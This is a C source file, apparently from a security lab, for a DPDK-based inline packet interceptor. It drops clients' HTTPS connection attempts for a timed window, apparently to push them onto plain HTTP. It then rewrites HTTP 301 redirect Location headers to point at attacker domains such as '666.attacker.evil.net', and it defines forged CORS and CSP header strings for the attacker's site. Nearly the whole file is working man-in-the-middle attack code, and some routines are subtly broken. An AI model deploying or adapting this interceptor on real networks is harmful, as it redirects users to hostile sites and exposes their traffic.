#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/queue.h>
#include <setjmp.h>
#include <stdarg.h>
#include <ctype.h>
#include <errno.h>
#include <getopt.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <rte_eal.h>
#include <rte_common.h>
#include <rte_malloc.h>
#include <rte_ether.h>
#include <rte_sft.h>
#include <rte_ethdev.h>
#include <rte_mempool.h>
#include <rte_mbuf.h>
#include <rte_net.h>
#include <rte_flow.h>
#include <rte_cycles.h>
#include <rte_hexdump.h>
#include <rte_byteorder.h>
#include <rte_ip.h>
#include <rte_tcp.h>
#include <rte_memcpy.h>
#include <rte_hash.h>
#include <rte_ring.h>
#include <rte_timer.h>

#include "flow_blocks.c"


#define RX_RING_SIZE 1024
#define TX_RING_SIZE 1024

#define NUM_MBUFS 8191
#define MBUF_CACHE_SIZE 250
#define BURST_SIZE 32
#define ANY_IP ((0<<24) + (0<<16) + (0<<8) + 0) /* src ip = 0.0.0.0 */
#define DEST_IP ((192<<24) + (168<<16) + (1<<8) + 1) /* dest ip = 192.168.1.1 */
// #define SERVER_IP RTE_IPV4(10, 10, 1, 1) /* server ip = 10.10.1.1 */
#define SERVER_IP RTE_IPV4(192, 168, 200, 1) /* server ip = 10.10.1.1 */
// #define CLIENT_IP RTE_IPV4(10, 10, 1, 2) /* client ip = 10.10.1.2 */
#define CLIENT_IP RTE_IPV4(192, 168, 200, 3) /* client ip = 10.10.1.2 */
#define FULL_MASK 0xffffffff /* full mask */
#define EMPTY_MASK 0x0 /* empty mask */
#define DEFAULT_HTTP_PORT 80
#define DEFAULT_HTTPS_PORT 443
#define ANY_PORT 0x0

#define EVIL_DOMAIN "www.oh.aksecuritylab.net"
#define OLD_DOMAIN "www.oh.aksecuritylab.com"
#define NEW_EVIL_DOMAIN "666.attacker.evil.net"

#define CHECK_INTERVAL 1000  /* 100ms */
#define MAX_REPEAT_TIMES 90  /* 9s (90 * 100ms) in total */

static volatile bool force_quit;

static uint16_t port_id;
static uint16_t port_id_rx, port_id_tx;
static uint16_t nr_queues = 1;
static uint8_t selected_queue_rx = 0;
struct rte_mempool *mbuf_pool;
struct rte_flow *flow;
static char new_http_payload_buffer[2048] = {0};


// IP-timer hash table structs
static struct rte_hash *ip_timer_map = NULL;
struct timer_data_s {
	struct rte_timer timer;
	uint32_t timer_value;
	uint32_t timer_arg;
	uint16_t timer_id;
	bool first_stage_done;
};

static struct timer_data_s timers[1024] = {0};
static struct rte_ring *timer_ring = NULL;

extern struct rte_flow *
generate_ipv4_flow(uint16_t port_id, uint16_t rx_q,
		uint32_t src_ip, uint32_t src_mask,
		uint32_t dest_ip, uint32_t dest_mask,
		uint16_t dest_port, uint16_t dest_port_mask,
		uint16_t src_port, uint16_t src_port_mask,
		bool is_rx,
		struct rte_flow_error *error);

static inline void
print_ether_addr(const char *what, struct rte_ether_addr *eth_addr)
{
	char buf[RTE_ETHER_ADDR_FMT_SIZE];
	rte_ether_format_addr(buf, RTE_ETHER_ADDR_FMT_SIZE, eth_addr);
	printf("%s%s", what, buf);
}


static void switch_words_in_place(char *payload, size_t start, char *end) {
	size_t curr_word = start;
	size_t next_word = start + 2;
	size_t domain_length = (size_t)end - start;
	volatile uint16_t *curr_word_ptr = (uint16_t *)payload[curr_word]; // cast from byte to word pointer
	uint16_t *next_word_ptr = (uint16_t *)payload[next_word];
	char byte1, byte2;
	// Ensure we don't go past the end
	while (next_word < (size_t)end && (next_word + 1) < (size_t)end) {
		// Swap the two words
		curr_word_ptr = (uint16_t *)(payload + curr_word); // cast from byte to word pointer
		next_word_ptr = (uint16_t *)(payload + next_word);
		if (rte_atomic16_cmpset(curr_word_ptr, *next_word_ptr, *curr_word_ptr) != 0) {
			printf("Current word and next word are equal, advancing pointers\n");
			curr_word = next_word;
			next_word += 2;
			continue;
		}

		byte1 = payload[curr_word];
		byte2 = payload[curr_word + 1];
		payload[curr_word] = payload[next_word];
		payload[curr_word + 1] = payload[next_word + 1];
		payload[next_word] = byte1;
		payload[next_word + 1] = byte2;
		// rte_atomic16_exchange(curr_word_ptr, *next_word_ptr);
		printf("Swapped words at offsets %zu and %zu\n", curr_word, next_word);
		printf("After swap: %*s\n", domain_length, payload + start);
		return;
	}
	printf("Failed to switch words in place\n");
}


static void release_timer(uint16_t timer_id) {
	struct timer_data_s *timer_data_ptr = &timers[timer_id];
	rte_timer_stop(&timer_data_ptr->timer);
	if (rte_ring_enqueue(timer_ring, timer_data_ptr) < 0) {
		fprintf(stderr, "Failed to enqueue timer ID back to timer ring\n");
		return;
	}
	printf("Enqueued timer ID: %u back to timer ring\n", timer_id);
}

static uint16_t hash_lookup(uint32_t ip) {
	uint16_t *value;
	int ret = rte_hash_lookup_data(ip_timer_map, &ip, (void **)&value);
	if (ret < 0) {
		// Not found
		return 0;
	}
	return *value;
}

static uint32_t hash_delete(uint32_t ip) {
	uint16_t timer_id = hash_lookup(ip);
	if (timer_id == 0) {
		// not found
		return -1;
	}

	release_timer(timer_id);
	int ret = rte_hash_del_key(ip_timer_map, &ip);
	if (ret < 0) {
		fprintf(stderr, "Failed to delete key from IP timer hash table: %s\n", rte_strerror(rte_errno));
		return -1;
	}
	return 0;
}

static void timer_expiry_callback(struct rte_timer *timer, void *arg) {
	struct timer_data_s *timer_data_ptr = (struct timer_data_s *)arg;
	uint32_t ip = timer_data_ptr->timer_arg;
	printf("Timer expired for IP: %u.%u.%u.%u\n",
		(ip >> 24) & 0xFF,
		(ip >> 16) & 0xFF,
		(ip >> 8) & 0xFF,
		ip & 0xFF);
	if (timer_data_ptr->first_stage_done == false) {
		// First stage: mark as done and reset timer for second stage
		timer_data_ptr->first_stage_done = true;
		printf("First stage done for IP: %u.%u.%u.%u, resetting timer for second stage\n",
			(ip >> 24) & 0xFF,
			(ip >> 16) & 0xFF,
			(ip >> 8) & 0xFF,
			ip & 0xFF);
		uint64_t second_stage_timer_value = rte_get_timer_hz() * 30; // 30 seconds
		rte_timer_reset(&timer_data_ptr->timer, second_stage_timer_value, SINGLE, rte_lcore_id(),
					(rte_timer_cb_t)timer_expiry_callback, timer_data_ptr);
		return;
	}
	// On timer expiry after second stage is done, remove the IP from the hash table
	hash_delete(ip);
}

static inline uint32_t ip_key_hash(const void *key, uint32_t length, uint32_t initval) {
	uint32_t ip = *(uint32_t *)key;
	return ip;
}

static void timer_ring_init(void) {
	rte_timer_subsystem_init();
	struct rte_ring *timer_ring_ptr = rte_ring_create("timer_ring", 1024, rte_socket_id(), RING_F_SP_ENQ | RING_F_SC_DEQ);
	if (timer_ring_ptr == NULL) {
		fprintf(stderr, "Failed to create timer ring: %s\n", rte_strerror(rte_errno));
		exit(EXIT_FAILURE);
	}
	printf("Timer ring created successfully\n");
	timer_ring = timer_ring_ptr;

	// populate timer ring
	struct timer_data_s *timer_data_ptr = NULL;
	for (uint32_t i = 1; i < 1024; i++) {
		rte_timer_init(&timers[i].timer);
		timer_data_ptr = &timers[i];
		timer_data_ptr->timer_id = i;
		if (rte_ring_enqueue(timer_ring, timer_data_ptr) < 0) {
			fprintf(stderr, "Failed to enqueue timer ID to timer ring: %s\n", rte_strerror(rte_errno));
			exit(EXIT_FAILURE);
		}
	}
}

// Function that creates hash tables for rules to forward or drop packets based on source IP
// Key: Source IP (uint32_t)
// Value: Timer event pointer
static void init_ip_timer_hash_table(void) {
	timer_ring_init();
	struct rte_hash_parameters hash_params = {
		.name = "ip_timer_map",
		.entries = 1024,
		.key_len = sizeof(uint32_t),
		.hash_func = ip_key_hash,
		.hash_func_init_val = 0,
	};
	ip_timer_map = rte_hash_create(&hash_params);
	if (ip_timer_map == NULL) {
		fprintf(stderr, "Failed to create IP timer hash table: %s\n", rte_strerror(rte_errno));
		exit(EXIT_FAILURE);
	}
	printf("IP timer hash table created successfully\n");
}

static struct timer_data_s* get_free_timer(uint32_t ip) {
	if (rte_ring_empty(timer_ring) == 1) {
		fprintf(stderr, "No free timers available in timer ring\n");
		return NULL;
	}

	struct timer_data_s *timer_data_ptr = NULL;
	if (rte_ring_dequeue(timer_ring, (void **)&timer_data_ptr) < 0) {
		fprintf(stderr, "No free timers available in timer ring\n");
		return NULL;
	}

	printf("Dequeued timer ID: %u\n", timer_data_ptr->timer_id);
	return timer_data_ptr;
}

static uint32_t hash_add(uint32_t ip, uint64_t timer_value) {
	struct timer_data_s *timer_data_ptr = NULL;
	uint16_t timer_id = hash_lookup(ip);
	if (timer_id != 0) {
		// already exists
		timer_data_ptr = &timers[timer_id];
	}
	else {
		timer_data_ptr = get_free_timer(ip);
		if (timer_data_ptr == NULL) {
			return -1;
		}
		uint16_t *timer_id_ptr = &timer_data_ptr->timer_id;
		int ret = rte_hash_add_key_data(ip_timer_map, &ip, (void *)timer_id_ptr);
		if (ret < 0) {
			fprintf(stderr, "Failed to add key to IP timer hash table: %s\n", rte_strerror(rte_errno));
			return -1;
		}
	}

	// start timer
	struct rte_timer *timer_ptr = &timer_data_ptr->timer;
	timer_data_ptr->timer_arg = ip;
	timer_data_ptr->first_stage_done = false;
	rte_timer_reset(timer_ptr, timer_value, SINGLE, rte_lcore_id(),
					(rte_timer_cb_t)timer_expiry_callback, timer_data_ptr);
	return 0;
}


int extract_tcp_headers(struct rte_mbuf *pkt, bool *forward_packet) {
    struct rte_ether_hdr *eth_hdr;
    struct rte_ipv4_hdr *ipv4_hdr;
    struct rte_tcp_hdr *tcp_hdr;
    uint16_t eth_hdr_len = sizeof(struct rte_ether_hdr);
    uint16_t ip_hdr_len, tcp_hdr_len;

    // Extract Ethernet header
    eth_hdr = rte_pktmbuf_mtod(pkt, struct rte_ether_hdr *);

    // Extract IPv4 header
    ipv4_hdr = (struct rte_ipv4_hdr *)(rte_pktmbuf_mtod(pkt, char *) + eth_hdr_len);
    ip_hdr_len = ipv4_hdr->ihl * 4;

    // Extract TCP header
    tcp_hdr = (struct rte_tcp_hdr *)((char *)ipv4_hdr + ip_hdr_len);
    tcp_hdr_len = (tcp_hdr->data_off >> 4) * 4;
	#ifdef CSUM_OFFLOAD
	pkt->ol_flags |= RTE_MBUF_F_TX_TCP_CKSUM | RTE_MBUF_F_TX_IP_CKSUM;
	tcp_hdr->cksum = 0;
	ipv4_hdr->hdr_checksum = 0;
	#endif

    // Convert total_length to host byte order
    uint16_t total_length = rte_be_to_cpu_16(ipv4_hdr->total_length);

    // Calculate the start of the TCP payload
    char *payload = (char *)tcp_hdr + tcp_hdr_len;
    uint16_t payload_len = total_length - ip_hdr_len - tcp_hdr_len;

    // Print intermediate values for debugging
    printf("eth_hdr_len: %u\n", eth_hdr_len);
    printf("ip_hdr_len: %u\n", ip_hdr_len);
	printf("ip_hdr_checksum: 0x%04X\n", rte_be_to_cpu_16(ipv4_hdr->hdr_checksum));
    printf("tcp_hdr_len: %u\n", tcp_hdr_len);
	printf("tcp_hdr_checksum: 0x%04X\n", rte_be_to_cpu_16(tcp_hdr->cksum));
    printf("total_length: %u\n", total_length);
    printf("payload_len: %u\n", payload_len);

    // Print source and destination IP addresses
    printf("Source IP: %u.%u.%u.%u\n",
        ipv4_hdr->src_addr & 0xFF,
        (ipv4_hdr->src_addr >> 8) & 0xFF,
        (ipv4_hdr->src_addr >> 16) & 0xFF,
        (ipv4_hdr->src_addr >> 24) & 0xFF);
    printf("Destination IP: %u.%u.%u.%u\n",
        ipv4_hdr->dst_addr & 0xFF,
        (ipv4_hdr->dst_addr >> 8) & 0xFF,
        (ipv4_hdr->dst_addr >> 16) & 0xFF,
        (ipv4_hdr->dst_addr >> 24) & 0xFF);

    // Print source and destination ports
    printf("Source Port: %u\n", rte_be_to_cpu_16(tcp_hdr->src_port));
    printf("Destination Port: %u\n", rte_be_to_cpu_16(tcp_hdr->dst_port));

    // Print entire packet
    rte_hexdump(stdout, "TCP Packet:", rte_pktmbuf_mtod(pkt, void *), pkt->pkt_len);

    // Print TCP payload separately if there is any payload
	size_t domain_name_offset = 0;
	const char *newline = "\r\n";
	const char *http_301_prefix = "HTTP/1.1 301 Moved Permanently";
	const char *http_ok_prefix = "HTTP/1.1 200 OK";
	const char *end_of_headers = "\r\n\r\n";
	const char *redirection_prefix = "Location: https://";
	const char *CORS_headers = "Access-Control-Allow-Origin: https://www.oh.aksecuritylab.net\r\n";
	const char *CSP_headeres = "Content-Security-Policy: script-src 'self' https://www.oh.aksecuritylab.net;\r\n";
	char *http_301_pos = NULL;
	char *http_ok_pos = NULL;
	char *headers_end_pos = NULL;
	const size_t redirection_prefix_len = strlen(redirection_prefix);
	size_t original_location_len = 0;
	char *location_pos = NULL;
	char *location_end = NULL;
	size_t domain_start = 0;
	char *domain_end = NULL;
	uint64_t timer_value = 0;
	int dst_port = rte_be_to_cpu_16(tcp_hdr->dst_port);
	uint16_t timer_id = 0;
	struct timer_data_s *timer_data_ptr = NULL;
	#ifdef INTERCEPTREDIRECT
	if (DEFAULT_HTTPS_PORT == dst_port) {
		printf("HTTPS packet detected\n");
		// Check hash tables for rules to forward or drop
		// first, check if this is a SYN packet from client to server
		if (tcp_hdr->tcp_flags & RTE_TCP_SYN_FLAG) {
			printf("SYN packet detected from client to server\n");
			// check if source IP is in hash table
			timer_id = hash_lookup(ipv4_hdr->src_addr);
			if (timer_id == 0) {
				printf("Source IP not in hash table, dropping packet\n");
				// create timer for this IP
				*forward_packet = false;
				timer_value = rte_get_timer_hz() * 15; // fifteen seconds
				hash_add(ipv4_hdr->src_addr, timer_value);
			}
			else {
				printf("Source IP found in hash table\n");
				timer_data_ptr = &timers[timer_id];
				if (timer_data_ptr->first_stage_done == true) {
					printf("First stage already done for this IP, forwarding packet\n");
					*forward_packet = true;
					return 0;
				}
				printf("First stage not done for this IP, dropping packet\n");
				*forward_packet = false;
			}
			return 0;
		}
		*forward_packet = true;
		return 0;
	}
	#endif

    if (payload_len > 0) {
        rte_hexdump(stdout, "TCP Payload:", payload, payload_len);
		#ifdef INTERCEPTREDIRECT

		// Modify HTTP 301 Redirect Location header if present
		http_301_pos = strstr(payload, http_301_prefix);
		if (http_301_pos) {
			printf("Detect HTTP 301 Redirect, attempt modification\n");
			location_pos = strstr(http_301_pos, redirection_prefix);
			if (location_pos) {
				printf("Found Location header, modifying...\n");
				location_end = strstr(location_pos, newline);
				if (location_end) {
					// Calculate lengths
					original_location_len = location_end - location_pos;
					domain_start = redirection_prefix_len + location_pos;
					domain_end = strstr((char *)domain_start, "/");
					// Replace domain name
					size_t domain_length = (size_t)domain_end - domain_start;
					#ifdef WORDSWAP
					if ((tcp_hdr_len + (domain_start - (size_t)payload)) % 2 == 0) {
						// Even offset, can switch words in place and maintain checksum
						printf("Even offset, switching words in place\n");
						switch_words_in_place(location_pos, redirection_prefix_len, original_location_len);
					}
					else {
						// Odd offset, need to advance one byte and then we can switch words without recalculating checksum
						printf("Odd offset, switching words with one byte advance\n");
						switch_words_in_place(location_pos, redirection_prefix_len + 1, original_location_len);
					}
					#endif
					#ifdef SAME_LENGTH_DOMAIN_SWAP
					if (domain_length == strlen(EVIL_DOMAIN)) {
						// Same length domain, can replace in place
						printf("Same length domain, replacing in place\n");
						rte_memcpy((void *)domain_start, EVIL_DOMAIN, domain_length);
						printf("After swap: %24s\n", (char *)domain_start);
					}
					#endif
					#ifdef NEW_DOMAIN_SWAP
					// Replace OLD_DOMAIN with NEW_EVIL_DOMAIN
					size_t new_domain_length = 21;
					size_t shift_amount = new_domain_length - domain_length;
					// new domain is not same size as old domain, need to shift rest of payload
					// use rte_pktmbuf_append and rte_pktmbuf_adj to adjust mbuf size
					if (shift_amount > 0) {
						if (rte_pktmbuf_append(pkt, shift_amount + 1) == NULL) {
							printf("Failed to append space to mbuf for new domain\n");
							return -1;
						}

						// Shift the rest of the payload
						// size_t bytes_to_move = payload_len - (size_t)(location_end);
						size_t bytes_to_move = payload + payload_len - (size_t)(domain_end);
						size_t num_bytes_before_domain = (size_t)(domain_start) - (size_t)payload;
						rte_memcpy((void *)new_http_payload_buffer, payload, num_bytes_before_domain);
						rte_memcpy((void *)(new_http_payload_buffer + num_bytes_before_domain), NEW_EVIL_DOMAIN, new_domain_length);
						rte_memcpy((void *)(new_http_payload_buffer + num_bytes_before_domain + new_domain_length), (void *)domain_end, bytes_to_move);
						rte_memcpy((void *)payload, new_http_payload_buffer, payload_len + shift_amount);

						// Update payload length
						// payload_len += shift_amount;
						// Update TCP header length
						// tcp_hdr->data_off = ((tcp_hdr_len + shift_amount) / 4 << 4) | (tcp_hdr->data_off & 0x0F);
						// Update IPv4 total length
						ipv4_hdr->total_length = rte_cpu_to_be_16(total_length + shift_amount);
						printf("Replaced domain with larger domain, updated lengths\n");
					}

					#endif
				}
				else {
					printf("Failed to find end of Location header (CR+LN)\n");
				}
			}
			else {
				printf("Failed to find Location header\n");
			}
		}
		#endif
    } else {
        printf("No TCP payload\n");
    }

    return 0;
}

/* >8 End of main_loop for flow filtering. */



static inline int
main_loop(bool intercept_http_redirect) {
    struct rte_mbuf *bufs[BURST_SIZE];
    uint16_t nb_rx;
	struct rte_flow_error error;

	// setup hash tables
	bool forward_packet = true;
	init_ip_timer_hash_table();

	while (!force_quit) {
	rte_timer_manage();
	RTE_ETH_FOREACH_DEV(port_id) {
		int queue_id;
		for (queue_id = 0; queue_id < 1; queue_id++) {
        // Receive packets
			nb_rx = rte_eth_rx_burst(port_id, queue_id, bufs, BURST_SIZE);
			if (nb_rx == 0) {
				continue;
			}

			for (uint16_t i = 0; i < nb_rx; i++) {
				struct rte_mbuf *buf = bufs[i];
				struct rte_ether_hdr *eth_hdr = rte_pktmbuf_mtod(buf, struct rte_ether_hdr *);

				// Check if the packet is ARP
				if (eth_hdr->ether_type == rte_be_to_cpu_16(RTE_ETHER_TYPE_ARP)) {
					// Forward the ARP packet
					uint16_t nb_tx = rte_eth_tx_burst(port_id ^ 1, queue_id, &buf, 1);
					if (nb_tx < 1) {
						rte_pktmbuf_free(buf);
					}
					continue;
				}

				// Check if the packet is IPv4
				if (eth_hdr->ether_type == rte_be_to_cpu_16(RTE_ETHER_TYPE_IPV4)) {
					struct rte_ipv4_hdr *ipv4_hdr = rte_pktmbuf_mtod_offset(buf, struct rte_ipv4_hdr *, sizeof(struct rte_ether_hdr));

					// Check if the packet is TCP
					if (ipv4_hdr->next_proto_id == IPPROTO_TCP) {
						// Print TCP packet contents
						extract_tcp_headers(buf, &forward_packet);
					}
				}

				// Forward the packet
				if (forward_packet) {
					uint16_t nb_tx = rte_eth_tx_burst(port_id ^ 1, queue_id, &buf, 1);
					if (nb_tx < 1) {
						rte_pktmbuf_free(buf);
					}
				}
				else {
					rte_pktmbuf_free(buf);
					forward_packet = true;
				}
			}
		}
	}
	}

	/* closing and releasing resources */
	int ret;
	RTE_ETH_FOREACH_DEV(port_id) {
		rte_flow_flush(port_id, &error);
		ret = rte_eth_dev_stop(port_id);
		if (ret < 0)
			printf("Failed to stop port %u: %s",
				port_id, rte_strerror(-ret));
		rte_eth_dev_close(port_id);
	}
	rte_ring_free(timer_ring);
	rte_hash_free(ip_timer_map);
	rte_timer_subsystem_finalize();
	return ret;
}



static void
assert_link_status(void)
{
	struct rte_eth_link link;
	uint8_t rep_cnt = MAX_REPEAT_TIMES;
	int link_get_err = -EINVAL;

	memset(&link, 0, sizeof(link));
	do {
		link_get_err = rte_eth_link_get(port_id, &link);
		if (link_get_err == 0 && link.link_status == RTE_ETH_LINK_UP)
			break;
		rte_delay_ms(CHECK_INTERVAL);
	} while (--rep_cnt);

	if (link_get_err < 0)
		rte_exit(EXIT_FAILURE, ":: error: link get is failing: %s\n",
			 rte_strerror(-link_get_err));
	if (link.link_status == RTE_ETH_LINK_DOWN)
		rte_exit(EXIT_FAILURE, ":: error: link is still down\n");
}

/* Port initialization used in flow filtering. 8< */


/* Main functional part of port initialization. 8< */
static inline int
port_init(uint16_t port)
{
	struct rte_eth_conf port_conf;
	const uint16_t rx_rings = 1, tx_rings = 1;
	uint16_t nb_rxd = RX_RING_SIZE;
	uint16_t nb_txd = TX_RING_SIZE;
	int retval;
	uint16_t q;
	struct rte_eth_dev_info dev_info;
	struct rte_eth_txconf txconf;

	if (!rte_eth_dev_is_valid_port(port))
		return -1;

	memset(&port_conf, 0, sizeof(struct rte_eth_conf));

	retval = rte_eth_dev_info_get(port, &dev_info);
	if (retval != 0) {
		printf("Error during getting device (port %u) info: %s\n",
				port, strerror(-retval));
		return retval;
	}

	if (dev_info.tx_offload_capa & RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE)
		port_conf.txmode.offloads |=
			RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE;

	if (dev_info.tx_offload_capa & RTE_ETH_TX_OFFLOAD_TCP_CKSUM) {
		port_conf.txmode.offloads |= RTE_ETH_TX_OFFLOAD_TCP_CKSUM;
	}

	if (dev_info.tx_offload_capa & RTE_ETH_TX_OFFLOAD_IPV4_CKSUM) {
		port_conf.txmode.offloads |= RTE_ETH_TX_OFFLOAD_IPV4_CKSUM;
	}

	/* Configure the Ethernet device. */
	retval = rte_eth_dev_configure(port, rx_rings, tx_rings, &port_conf);
	if (retval != 0)
		return retval;

	retval = rte_eth_dev_adjust_nb_rx_tx_desc(port, &nb_rxd, &nb_txd);
	if (retval != 0)
		return retval;

	/* Allocate and set up 1 RX queue per Ethernet port. */
	for (q = 0; q < rx_rings; q++) {
		retval = rte_eth_rx_queue_setup(port, q, nb_rxd,
				rte_eth_dev_socket_id(port), NULL, mbuf_pool);
		if (retval < 0)
			return retval;
	}

	txconf = dev_info.default_txconf;
	txconf.offloads = port_conf.txmode.offloads;
	/* Allocate and set up 1 TX queue per Ethernet port. */
	for (q = 0; q < tx_rings; q++) {
		retval = rte_eth_tx_queue_setup(port, q, nb_txd,
				rte_eth_dev_socket_id(port), &txconf);
		if (retval < 0)
			return retval;
	}

	/* Starting Ethernet port. 8< */
	retval = rte_eth_dev_start(port);
	/* >8 End of starting of ethernet port. */
	if (retval < 0)
		return retval;

	/* Display the port MAC address. */
	struct rte_ether_addr addr;
	retval = rte_eth_macaddr_get(port, &addr);
	if (retval != 0)
		return retval;

	printf("Port %u MAC: %02" PRIx8 " %02" PRIx8 " %02" PRIx8
			   " %02" PRIx8 " %02" PRIx8 " %02" PRIx8 "\n",
			port, RTE_ETHER_ADDR_BYTES(&addr));

	/* Enable RX in promiscuous mode for the Ethernet device. */
	retval = rte_eth_promiscuous_enable(port);
	/* End of setting RX port in promiscuous mode. */
	if (retval != 0)
		return retval;

	assert_link_status();
	printf(":: initializing port: %d done\n", port);
	return 0;
}

static void
signal_handler(int signum)
{
	if (signum == SIGINT || signum == SIGTERM) {
		printf("\n\nSignal %d received, preparing to exit...\n",
				signum);
		force_quit = true;
	}
}

int
main(int argc, char **argv)
{
	bool intercept_http_redirect = true;
	int ret;
	uint16_t nr_ports;
	struct rte_flow_error error;

	/* Initialize EAL. 8< */
	ret = rte_eal_init(argc, argv);
	if (ret < 0)
		rte_exit(EXIT_FAILURE, ":: invalid EAL arguments\n");
	/* >8 End of Initialization of EAL. */

	force_quit = false;
	signal(SIGINT, signal_handler);
	signal(SIGTERM, signal_handler);

	nr_ports = rte_eth_dev_count_avail();
	if (nr_ports == 0)
		rte_exit(EXIT_FAILURE, ":: no Ethernet ports found\n");
	port_id_tx = 1;
	port_id_rx = 0;
	if (nr_ports < 2) {
		rte_exit(EXIT_FAILURE, ":: warn: %d ports detected, but we use two: port %u (rx) and port %u (tx)\n",
			nr_ports, port_id_rx, port_id_tx);
	}
	/* Allocates a mempool to hold the mbufs. 8< */
	mbuf_pool = rte_pktmbuf_pool_create("mbuf_pool", NUM_MBUFS * nr_ports, MBUF_CACHE_SIZE, 0,
					    RTE_MBUF_DEFAULT_BUF_SIZE,
					    rte_socket_id());
	/* >8 End of allocating a mempool to hold the mbufs. */
	if (mbuf_pool == NULL)
		rte_exit(EXIT_FAILURE, "Cannot init mbuf pool\n");

	RTE_ETH_FOREACH_DEV(port_id) {
		if (port_init(port_id) != 0)
			rte_exit(EXIT_FAILURE, "Cannot init port %"PRIu16 "\n",
					port_id);
		/* Initializes all the ports using the user defined init_port(). 8< */
		/* >8 End of Initializing the ports using user defined init_port(). */

		/* Create flow for send packet. 8< */
		flow = generate_ipv4_flow(port_id, selected_queue_rx,
					RTE_IPV4_ANY, EMPTY_MASK,
					RTE_IPV4_ANY, FULL_MASK,
					DEFAULT_HTTPS_PORT, FULL_MASK,
					ANY_PORT, EMPTY_MASK,
					true,
					&error);
		/* >8 End of create flow and the flow rule. */
		if (!flow) {
			printf("Flow can't be created %d message: %s\n",
				error.type,
				error.message ? error.message : "(no stated reason)");
			rte_exit(EXIT_FAILURE, "error in creating flow");
		}
		flow = generate_ipv4_flow(port_id, selected_queue_rx,
					RTE_IPV4_ANY, EMPTY_MASK,
					RTE_IPV4_ANY, FULL_MASK,
					DEFAULT_HTTP_PORT, FULL_MASK,
					ANY_PORT, EMPTY_MASK,
					true,
					&error);
		/* >8 End of create flow and the flow rule. */

		if (!flow) {
			printf("Flow can't be created %d message: %s\n",
				error.type,
				error.message ? error.message : "(no stated reason)");
			rte_exit(EXIT_FAILURE, "error in creating flow");
		}
		/* >8 End of creating flow for send packet with. */

		flow = generate_tcp_syn_flow(port_id, selected_queue_rx,
					RTE_IPV4_ANY, EMPTY_MASK,
					RTE_IPV4_ANY, FULL_MASK,
					DEFAULT_HTTPS_PORT, FULL_MASK,
					ANY_PORT, EMPTY_MASK,
					true,
					&error);
		/* >8 End of create flow and the flow rule. */

		if (!flow) {
			printf("Flow can't be created %d message: %s\n",
				error.type,
				error.message ? error.message : "(no stated reason)");
			rte_exit(EXIT_FAILURE, "error in creating flow");
		}

		/* Create flow for receive packet. 8< */
		if (!intercept_http_redirect) { // Incoming packets are not interesting to us if we don't intercept HTTP redirects
			flow = generate_ipv4_flow(port_id, selected_queue_rx,
				RTE_IPV4_ANY, FULL_MASK,
				RTE_IPV4_ANY, EMPTY_MASK,
				ANY_PORT, EMPTY_MASK,
				DEFAULT_HTTP_PORT, FULL_MASK,
				false,
				&error);
			/* >8 End of create flow and the flow rule. */
			if (!flow) {
				printf("Flow can't be created %d message: %s\n",
				error.type,
				error.message ? error.message : "(no stated reason)");
				rte_exit(EXIT_FAILURE, "error in creating flow");
			}
			flow = generate_ipv4_flow(port_id, selected_queue_rx,
				RTE_IPV4_ANY, FULL_MASK,
				RTE_IPV4_ANY, EMPTY_MASK,
				ANY_PORT, EMPTY_MASK,
				DEFAULT_HTTPS_PORT, FULL_MASK,
				false,
				&error);
				/* >8 End of create flow and the flow rule. */
			if (!flow) {
				printf("Flow can't be created %d message: %s\n",
				error.type,
				error.message ? error.message : "(no stated reason)");
				rte_exit(EXIT_FAILURE, "error in creating flow");
			}
			/* >8 End of creating flow for receive packet with. */
		}
	}
	// }

	/* Launching main_loop(). 8< */
	ret = main_loop(intercept_http_redirect);
	/* >8 End of launching main_loop(). */

	/* clean up the EAL */
	rte_eal_cleanup();

	return ret;
}
